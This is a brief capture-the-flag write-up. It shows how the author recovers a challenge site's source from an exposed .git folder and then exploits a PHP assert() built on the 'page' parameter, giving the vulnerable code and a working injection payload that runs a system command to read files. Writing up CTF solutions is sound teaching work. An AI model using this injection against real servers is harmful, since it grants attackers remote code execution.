# mfw / My first web server

In this challenge, we had as hint that there was PHP, GIT & bootstrap.

So GIT was the first hint: 

```
  challenge/.git/ 
```

Found all objects but was unable to git clone the repository.

Instead, I downloaded each file in the .git repository and used the 

```
  git checkout -- index.php templates/*
```

to get all the files back.
By Birdy42

By reading the source we can quickly see where the vuln is: a misused assert() allow us to inject php code by the $file var:

```
if (isset($_GET['page'])) {
        $page = $_GET['page'];
} else {
        $page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```

Okey, so we want execute some codes, specially system command, but first we have to make a good formed assertion, it give us a payload like that:

```
','..') === system('cat templates/*') || strpos('huhu
```
And you get the flag!
